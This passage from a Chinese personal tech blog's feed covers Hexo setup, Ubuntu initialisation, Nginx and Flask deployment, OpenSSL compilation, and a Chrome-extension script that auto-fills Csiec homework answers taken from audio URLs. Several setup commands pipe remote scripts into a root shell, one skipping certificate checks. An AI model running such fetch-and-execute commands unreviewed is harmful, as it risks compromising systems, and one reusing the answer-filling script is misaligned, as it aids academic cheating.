<span class="string">||</span> <span class="string">envelope</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏头像</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line"><span class="attr">  url:</span> <span class="string">/uploads/avatar.jpg</span> <span class="comment"># source/...</span></span><br><span class="line"><span class="attr">  rounded:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏</span></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line"><span class="attr">  position:</span> <span class="string">right</span> <span class="comment"># 显示位置</span></span><br><span class="line"><span class="attr">  display:</span> <span class="string">always</span> <span class="comment"># 始终显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储阅读位置</span></span><br><span class="line"><span class="attr">save_scroll:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码框</span></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line"><span class="attr">  border_radius:</span> <span class="number">5</span>    <span class="comment"># 代码框半径</span></span><br><span class="line"><span class="attr">  copy_button:</span></span><br><span class="line"><span class="attr">    enable:</span> <span class="literal">true</span>      <span class="comment"># 显示复制按钮</span></span><br><span class="line"><span class="attr">    show_result:</span> <span class="literal">true</span> <span class="comment"># 显示复制结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文末公众号二维码</span></span><br><span class="line"><span class="attr">wechat_subscriber:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  qcode:</span> <span class="string">/uploads/qrcode.jpg</span> <span class="comment"># source/...</span></span><br><span class="line"><span class="attr">  description:</span> <span class="string">有没有兴趣关注一下公众号鸭</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码高亮主题</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">night</span> <span class="string">eighties</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tagcloud:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容搜索</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  top_n_per_article:</span> <span class="number">3</span> <span class="comment"># 显示每篇文章前3项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动画</span></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line"><span class="attr">  async:</span> <span class="literal">true</span> <span class="comment"># 直观表现为所有模块同时运动，显示速度快</span></span><br></pre></td></tr></table></figure><h2 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h2><p>将域名 <code>www.hydewww.cn</code> 绑定至博客，需在 <code>/source/</code> 下新建文件 <code>CNAME</code> ，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.hydewww.cn</span><br></pre></td></tr></table></figure><p>同时需要在域名解析服务中创建规则。</p><h1 id="Markdown拓展"><a href="#Markdown拓展" class="headerlink" title="Markdown拓展"></a>Markdown拓展</h1><p>写作工具推荐使用<a href="https://typora.io/" target="_blank" rel="noopener">Typora</a></p><h2 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h2><p>在文章开头添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo NexT 博客搭建</span><br><span class="line">date: 2018/5/14 00:00:00</span><br><span class="line">updated: 2019/5/21 00:00:00</span><br><span class="line">categories: Misc</span><br><span class="line">tags: [hexo, next]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>在文章某处添加 <code>&lt;!--more--&gt;</code> ，博客首页就只会摘录这之前的内容进行显示。</p><h1 id="Hexo-命令"><a href="#Hexo-命令" class="headerlink" title="Hexo 命令"></a>Hexo 命令</h1><p>命令可使用 <code>--debug</code> 显示调试信息</p><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>hexo s [--drafts]</code></td><td>本地测试，<code>—drafts</code> 渲染 <code>_drafts</code> 目录中的草稿</td></tr><tr><td><code>hexo clean</code></td><td>清除缓存和静态文件</td></tr><tr><td><code>hexo g [-w]</code></td><td>生成静态文件，<code>-w</code> 参数监视文件变动</td></tr><tr><td><code>hexo d</code></td><td>部署网站，需要先生成静态文件</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;博客被自己搞崩了，重搭顺便记录一下过程。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hexo.io/zh-cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt; 是一个基于Node.js的博客框架，文章使用Markdown语法，很容易就能部署到GitHub Pages、Coding Pages上。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://theme-next.iissnan.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;NexT&lt;/a&gt; 是Hexo颇受欢迎的一个主题，即本博客所使用的主题，更多主题请看&lt;a href=&quot;https://hexo.io/themes/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;此页面&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="Service" scheme="https://www.hydewww.cn/categories/Service/"/>
    
    
      <category term="hexo" scheme="https://www.hydewww.cn/tags/hexo/"/>
    
      <category term="next" scheme="https://www.hydewww.cn/tags/next/"/>
    
      <category term="github pages" scheme="https://www.hydewww.cn/tags/github-pages/"/>
    
      <category term="coding pages" scheme="https://www.hydewww.cn/tags/coding-pages/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu18 初始化</title>
    <link href="https://www.hydewww.cn/ubuntu18_init/"/>
    <id>https://www.hydewww.cn/ubuntu18_init/</id>
    <published>2018-01-25T16:00:00.000Z</published>
    <updated>2019-05-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>偷懒用</p><a id="more"></a><h1 id="Mirror"><a href="#Mirror" class="headerlink" title="Mirror"></a><a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">Mirror</a></h1><p>改至清华源</p><h2 id="apt"><a href="#apt" class="headerlink" title="apt"></a><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">apt</a></h2><p><code>/etc/apt/sources.list</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">'echo "deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line"><span class="string">                deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">                deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">                deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse" &gt; /etc/apt/sources.list'</span></span><br></pre></td></tr></table></figure><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a><a href="https://mirrors.tuna.tsinghua.edu.cn/help/pypi/" target="_blank" rel="noopener">pip</a></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pip -U</span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h2 id="homebrew"><a href="#homebrew" class="headerlink" title="*homebrew"></a><a href="https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/" target="_blank" rel="noopener">*homebrew</a></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git</span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git</span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.zsh_profile</span><br><span class="line"><span class="built_in">source</span> ~/.zsh_profile</span><br></pre></td></tr></table></figure><h1 id="Software"><a href="#Software" class="headerlink" title="Software"></a>Software</h1><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh my zsh"></a><a href="https://ohmyz.sh/" target="_blank" rel="noopener">oh my zsh</a></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y zsh</span><br><span class="line">chsh -s /usr/bin/zsh</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure><h2 id="V2Ray"><a href="#V2Ray" class="headerlink" title="V2Ray"></a><a href="https://v2ray.com/" target="_blank" rel="noopener">V2Ray</a></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>frp : <a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a></p><h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">"<span class="variable">$(wget https://www.hydewww.cn/uploads/ubuntu.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ $(id -u) != <span class="string">"0"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" Use sudo!"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line"></span><br><span class="line">sudo bash -c <span class="string">'echo "deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse" &gt; /etc/apt/sources.list'</span></span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y zsh wget curl git</span><br><span class="line"></span><br><span class="line">pip install -U pip</span><br><span class="line">pip config <span class="built_in">set</span> global.index-url </span><br><span class="line"></span><br><span class="line">wget --no-check-certificate <span class="string">"https://github.com/teddysun/across/raw/master/bbr.sh"</span></span><br><span class="line">chmod +x bbr.sh</span><br><span class="line">sudo ./bbr.sh</span><br><span class="line"></span><br><span class="line">chsh -s /usr/bin/zsh</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;偷懒用&lt;/p&gt;
    
    </summary>
    
      <category term="Service" scheme="https://www.hydewww.cn/categories/Service/"/>
    
    
      <category term="ubuntu18" scheme="https://www.hydewww.cn/tags/ubuntu18/"/>
    
      <category term="换源" scheme="https://www.hydewww.cn/tags/%E6%8D%A2%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>Nginx配置</title>
    <link href="https://www.hydewww.cn/nginx_conf/"/>
    <id>https://www.hydewww.cn/nginx_conf/</id>
    <published>2018-01-24T16:00:00.000Z</published>
    <updated>2018-01-24T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>这学期用 <code>Nginx</code> 搭了很多 web 服务，整理下nginx的一些配置方法 _(:з」∠)_</p><a id="more"></a><h1 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h1><p>nginx默认路径/etc/nginx/</p><h2 id="sites-available-sites-enabled"><a href="#sites-available-sites-enabled" class="headerlink" title="sites-available / sites-enabled"></a>sites-available / sites-enabled</h2><p>available文件夹存放已设置好的配置文件，enabled则存放启用的配置文件，可通过link命令建立软链接启用（类似快捷方式）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s sites-available/a sites-enabled/a</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 80; # 监听ipv4</span><br><span class="line">  listen [::]:80; # 监听ipv6</span><br><span class="line">  server_name ...; # 域名</span><br><span class="line">  </span><br><span class="line">  location / # 即域名根目录，若是/web则是.com/web/</span><br><span class="line">  &#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过设置不同的server_name，即可实现一台主机配置多个站点，且不用通过端口访问。</p><p>配置可分为多个文件，也可以放在一个文件里。配置好后，执行如下命令进行重启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><h1 id="直接转发"><a href="#直接转发" class="headerlink" title="直接转发"></a>直接转发</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name ...;</span><br><span class="line">  </span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:xxxx</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">    server_name ...;</span><br><span class="line">    root ...; # 网站根目录</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">    # 默认主页</span><br><span class="line">    index index.php index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="FLASK"><a href="#FLASK" class="headerlink" title="FLASK"></a>FLASK</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen  80;</span><br><span class="line">  server_name ...;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">include      uwsgi_params;</span><br><span class="line">uwsgi_pass   127.0.0.1:xxxx;</span><br><span class="line">uwsgi_param UWSGI_CHDIR  ...; # 网站根目录</span><br><span class="line">uwsgi_param UWSGI_SCRIPT manage:app; # 文件:应用名</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="禁止通过ip访问"><a href="#禁止通过ip访问" class="headerlink" title="禁止通过ip访问"></a>禁止通过ip访问</h1><p>官方文档中推荐设置为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server; # 默认server</span><br><span class="line">    listen [::]:80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 444;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若不增加server_name _，则会影响其它server的域名访问功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这学期用 &lt;code&gt;Nginx&lt;/code&gt; 搭了很多 web 服务，整理下nginx的一些配置方法 _(:з」∠)_&lt;/p&gt;
    
    </summary>
    
      <category term="Service" scheme="https://www.hydewww.cn/categories/Service/"/>
    
    
      <category term="Nginx" scheme="https://www.hydewww.cn/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>flask+uwsgi+nginx+supervisor</title>
    <link href="https://www.hydewww.cn/flask_deploy/"/>
    <id>https://www.hydewww.cn/flask_deploy/</id>
    <published>2018-01-24T16:00:00.000Z</published>
    <updated>2018-01-24T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>flask自带的服务器不够稳定，作为生产服还是要用uwsgi+nginx+supervisor。</p><a id="more"></a><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install -y supervisor nginx</span><br><span class="line">pip install requests flask flask-bootstrap flask-script flask-sqlalchemy flask-wtf flask-login uwsgi</span><br></pre></td></tr></table></figure><h1 id="uwsgi"><a href="#uwsgi" class="headerlink" title="uwsgi"></a>uwsgi</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># test_uwsgi.ini</span><br><span class="line">[test]</span><br><span class="line">socket = 127.0.0.1:xxxx</span><br><span class="line">chdir = ... # 网站根目录</span><br><span class="line">wsgi-file = manage.py</span><br><span class="line">callable = app</span><br><span class="line">processes = 2</span><br><span class="line">enable-threads = true</span><br></pre></td></tr></table></figure><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># test_nginx.conf</span><br><span class="line">server &#123;</span><br><span class="line">  listen  80;</span><br><span class="line">  server_name ...;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">include      uwsgi_params;</span><br><span class="line">uwsgi_pass   127.0.0.1:xxxx; # 与uwsgi相同端口</span><br><span class="line">uwsgi_param UWSGI_CHDIR  ...; # 网站根目录</span><br><span class="line">uwsgi_param UWSGI_SCRIPT manage:app; # 与uwsgi相同 文件:应用</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="supervisor"><a href="#supervisor" class="headerlink" title="supervisor"></a>supervisor</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># test_super.conf</span><br><span class="line">[program:xss]</span><br><span class="line">command=/usr/local/bin/uwsgi .../test_uwsgi.ini # uswgi文件路径</span><br><span class="line">directory=... # 网站根目录</span><br><span class="line">user=root # 运行用户</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br><span class="line">stdout_logfile=.../test.log</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;flask自带的服务器不够稳定，作为生产服还是要用uwsgi+nginx+supervisor。&lt;/p&gt;
    
    </summary>
    
      <category term="Service" scheme="https://www.hydewww.cn/categories/Service/"/>
    
    
      <category term="flask" scheme="https://www.hydewww.cn/tags/flask/"/>
    
      <category term="uwsgi" scheme="https://www.hydewww.cn/tags/uwsgi/"/>
    
      <category term="supervisor" scheme="https://www.hydewww.cn/tags/supervisor/"/>
    
  </entry>
  
  <entry>
    <title>Win10 VS2017 下编译 openssl</title>
    <link href="https://www.hydewww.cn/openssl-win10/"/>
    <id>https://www.hydewww.cn/openssl-win10/</id>
    <published>2017-12-03T16:00:00.000Z</published>
    <updated>2017-12-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>实验需要用到openssl，然而下载的库无法直接使用，经查编译版本不同无法兼容。自己编译过程中由于网上资料过时，踩了些坑，记录一下操作过程。</p><a id="more"></a><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>win10</p><p>VS2017</p><p><a href="https://www.openssl.org/" target="_blank" rel="noopener">openssl</a> 1.0.2m</p><p><a href="https://www.activestate.com/activeperl" target="_blank" rel="noopener">ActivePerl</a> 5.26</p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>打开vs2017自带的命令行 (<em>安装目录</em>\Microsoft Visual Studio\2017\ <em>Edition</em>\VC)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd 路径\openssl-1.0.2m</span><br><span class="line">perl Configure VC-WIN64A no-asm</span><br><span class="line">ms\do_win64a.bat</span><br><span class="line">nmake -f ms\nt.mak # 静态编译</span><br><span class="line">(nmake -f ms\ntdll.mak # 动态编译)</span><br><span class="line">nmake -f ms\nt.mak test # 测试 通过显示 passed all tests</span><br><span class="line">nmake -f ms\nt.mak install # 安装</span><br></pre></td></tr></table></figure><p>虽然通过64位编译，不过在32位项目里仍然可以使用，不知原因0 0</p><h1 id="配置项目"><a href="#配置项目" class="headerlink" title="配置项目"></a>配置项目</h1><p>vs2017中打开_项目_ - <em>(项目名)属性</em> 菜单</p><p>在 <em>VC++目录</em> - <em>包含目录</em> 中添加 <em>(location)\ssl\include</em> ，库目录中添加 <em>(location)\ssl\lib</em></p><p>在 <em>链接器</em> - _输入_ - <em>附加依赖项</em> 中添加 <em>libeay32.lib</em> , <em>ssleay32.lib</em></p><h1 id="使用库"><a href="#使用库" class="headerlink" title="使用库"></a>使用库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;openssl/ssl.h&gt;</span><br><span class="line">#include&lt;openssl/opensslv.h&gt;</span><br></pre></td></tr></table></figure><p>没引入opensslv.h时报错： _无法解析的符号 <em>TLS_client_method</em>_</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验需要用到openssl，然而下载的库无法直接使用，经查编译版本不同无法兼容。自己编译过程中由于网上资料过时，踩了些坑，记录一下操作过程。&lt;/p&gt;
    
    </summary>
    
      <category term="Security" scheme="https://www.hydewww.cn/categories/Security/"/>
    
    
      <category term="openssl" scheme="https://www.hydewww.cn/tags/openssl/"/>
    
  </entry>
  
  <entry>
    <title>Csiec 自动填词</title>
    <link href="https://www.hydewww.cn/csiec/"/>
    <id>https://www.hydewww.cn/csiec/</id>
    <published>2017-10-29T16:00:00.000Z</published>
    <updated>2019-05-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>每两周都要做csiec，发现单词答案就在音频的url中 ，尝试了一下用 <code>javascript</code> 自动填写答案。一开始实现代码在 <code>console</code> 中运行，最后做成 chrome 插件。</p><a id="more"></a><p>音频位置如图</p><p><img src="https://raw.githubusercontent.com/hydewww/CSEIC/master/screenshot.png" alt="screenshot"></p><p>代码地址： <a href="https://github.com/hydewww/CSEIC" target="_blank" rel="noopener">https://github.com/hydewww/CSEIC</a></p><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// csiec.js</span></span><br><span class="line"><span class="keyword">var</span> forms = <span class="built_in">document</span>.getElementsByClassName(<span class="string">"formulation clearfix"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;forms.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> word = forms[i].getElementsByTagName(<span class="string">"audio"</span>)[<span class="number">0</span>].src.split(<span class="string">'/'</span>)[<span class="number">4</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>].replace(<span class="regexp">/%20/g</span>, <span class="string">" "</span>);</span><br><span class="line">    forms[i].getElementsByTagName(<span class="string">"input"</span>)[<span class="number">1</span>].value = word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Note :</strong></p><ol><li>getElementsByClassName()</li><li>getElementsByTagName()</li><li>getElementById()</li><li>document全文搜索</li><li>js的replace()只替换第一个，用正则替换全部</li><li>js 不能直接遍历element对象</li></ol><h2 id="Chrome-Extension"><a href="#Chrome-Extension" class="headerlink" title="Chrome Extension"></a>Chrome Extension</h2><p><a href="https://github.com/hydewww/CSEIC" target="_blank" rel="noopener">https://github.com/hydewww/CSEIC</a></p><p>chrome 插件需要编写一个 <code>manifest.json</code> ，通过 <code>content_scripts</code> 中的<code>match</code> 对特定 url 自动执行 <code>js</code> 脚本。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 